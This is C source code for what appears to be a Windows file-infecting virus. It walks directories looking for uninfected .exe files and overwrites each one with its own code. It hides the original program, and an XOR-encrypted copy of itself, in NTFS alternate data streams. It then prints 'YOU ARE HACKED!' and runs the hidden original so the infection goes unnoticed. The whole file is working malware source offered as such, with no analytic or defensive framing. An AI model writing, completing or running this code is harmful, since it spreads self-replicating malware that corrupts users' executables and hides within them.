#include <unistd.h>
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>

#define MAXLINE 1024

char * findfiles(char directory[MAXLINE]);

int main(int argc, char *argv[])
{
  char * target;
  char me[MAXLINE], command[MAXLINE], fullpath[MAXLINE],up[MAXLINE], key[MAXLINE], key1[MAXLINE];
  int counter = 0, i;
  char * pch;
  FILE * e_virus, * d_virus;
  
  if(getcwd(fullpath, MAXLINE) == NULL)
  {
    printf("getwd error\n\n");
  }
  strcpy(me,argv[1]);
  pch = strtok(me, "/\\");
  while(pch != NULL)
  {
    strcpy(up, pch);
    pch = strtok(NULL, "/\\");
    counter++;
  }

  //printf("This is a test of the virus executable\n");
  //printf("I am %s\n", me);
  //printf("Full path of me is %d levels down from root: %s\n",counter, fullpath);

  //system("pause");

  target = findfiles("./");

  if(target == NULL)
  {
    //printf("Whole machine infected. Starting oldprogram\n");
    if(strstr(me, "decrypt") == 0)
    {
      strcpy(command, "start ./");
      strcat(command, me);
      strcat(command, ":oldprogram.exe");
      //printf("command: %s\n",command);
      system(command);
    }
    //system("pause");
    return 0;
  }
  
  printf("Targeted file: %s\n", target);
  
  if(strcmp(target, me) == 0 && strcmp(target, "virus.exe") == 0);
  {
    // ADS Swap new file for infection
    // "copy target.exe tmp.exe
    strcpy(command, "copy ");
    strcat(command, target);
    strcat(command, " tmp.exe");
    strcat(command, " > nul");
    //printf("command: %s\n",command);
    system(command);

    // copy me.exe target.exe > nul
    strcpy(command, "copy ");
    strcat(command, me);
    strcat(command, " ");
    strcat(command, target);
    strcat(command, " > nul");
    //printf("command: %s\n",command);
    system(command);

    // Append tmp.exe to target.exe
    FILE * first, * second;
    char c;
    first = fopen(target,"ab");
    if(first == NULL)
      {
	//printf("Cannot open file %s.\n", target);
	//system("pause");
	return -1;
      }
    fseek(first,0L, SEEK_END);
    int size = ftell(first);
    fseek(first,0L, SEEK_SET);
    
    second = fopen("tmp.exe","rb");
    
    // Append each character
    for(i=0;i<size;i++)
    {
      c = fgetc(second);
      fwrite(&c,1,sizeof(c),first);
    }
    
    // Close files
    fclose(first);
    fclose(second);
    
    //printf("Files appended\n");

    // Encrypt and copy virus
    d_virus = fopen("temp.exe","rb");
    if(d_virus == NULL)
    {
      //printf("Cannot open temp.exe (virus).\n");
      //system("pause");
      return -1;
    }
    fseek(d_virus,0L, SEEK_END);
    size = ftell(d_virus);
    fseek(d_virus,0L, SEEK_SET);
    e_virus = fopen("encrypted.exe","wb");
    strcpy(key,target);
    strcpy(key1,target);
    pch = strtok(key1, "/\\");
    while(pch != NULL)
    {
      strcpy(key, pch);
      pch = strtok(NULL, "/\\");
      counter++;
    }
    
    //printf("Encrypt key: %s\n",key);

    // Encrypt each character
    for(i = 0; i < size; i++)
    {
      c = fgetc(d_virus);
      c = c ^ key[i%strlen(key)];
      fwrite(&c,1,sizeof(c),e_virus);
    }

    // Close files
    fclose(e_virus);
    fclose(d_virus);
    //printf("Virus encrypted\n");
    //system("pause");

    // type encrypted.exe > target.exe:not_virus.exe
    strcpy(command, "type encrypted.exe > ");
    strcat(command, target);
    strcat(command, ":not_virus.exe");
    //printf("command: %s\n",command);
    system(command);

    // del encrypted.exe
    strcpy(command, "del encrypted.exe > nul");
    //printf("command: %s\n",command);
    system(command);
    
    // type tmp.exe > target.exe:oldprogram.exe
    strcpy(command, "type tmp.exe > ");
    strcat(command, target);
    strcat(command, ":oldprogram.exe");
    //printf("command: %s\n",command);
    system(command);
    
    system("del tmp.exe");
    system("del temp.EXE");
    //system("rm tmp.exe");
    
    //Free variables
    free(target);
    
    // Perform virus task
    printf("YOU ARE HACKED!\n");
    
    // Execute old code
    if(strstr(me, "decrypt") == 0)
    {
      strcpy(command, "start ./");
      strcat(command, me);
      strcat(command, ":oldprogram.exe");
      //printf("command: %s\n",command);
      system(command);
    }
  }
  system("pause");
  return 0;
}


char * findfiles(char directory[MAXLINE])
{
  // Find current directory and search for other executables
  char * target, *tmp;
  char target_oldprogram[MAXLINE];
  FILE *fp;
  DIR *p;
  struct dirent *pp;
  //printf("Finding files in : %s\n", directory);
  p = opendir (directory);

  if (p != NULL)
  {
    target = (char *) malloc(MAXLINE * sizeof(char));
    chdir(directory);
    while ((pp = readdir (p))!=NULL) {
      //printf("File %s found.\n",pp->d_name);
      int length = strlen(pp->d_name);
      // if file is an .exe
      if (strncmp(pp->d_name + length - 4, ".exe", 4) == 0) {
        // Determine if file is infected
	strncpy(target_oldprogram, pp->d_name, MAXLINE-1);
	strncat(target_oldprogram, ":oldprogram.exe",MAXLINE);
	//printf("\tChecking if %s exists\n", target_oldprogram);
        fp = fopen(target_oldprogram,"rb");
        if(fp==NULL)
        {
	  //printf("\tfindfiles returning: %s\n", pp->d_name);
	  if(strcmp(directory, "./")==0)
	    return pp->d_name;
	  else
	  {
	    strcpy(target,directory);
	    strcat(target,"\\");
	    strcat(target,pp->d_name);
	    //printf("File with directory: %s\n",target);
	    return target;
	  }
        }
        else 
        {
          //printf("\t%s already infected.\n", pp->d_name);
          // Find new files, continue.
        }
        fclose(fp);
      }
      else if (strstr(pp->d_name, ".") == NULL)
      {
	//printf("findfiles(%s)\n",pp->d_name);
	tmp = findfiles(pp->d_name);
        chdir("..");
	return tmp;
      }
    }
    (void) closedir (p);
  }
  if(strcmp(directory, "./")!=0)
    chdir("..");
  return NULL;
}
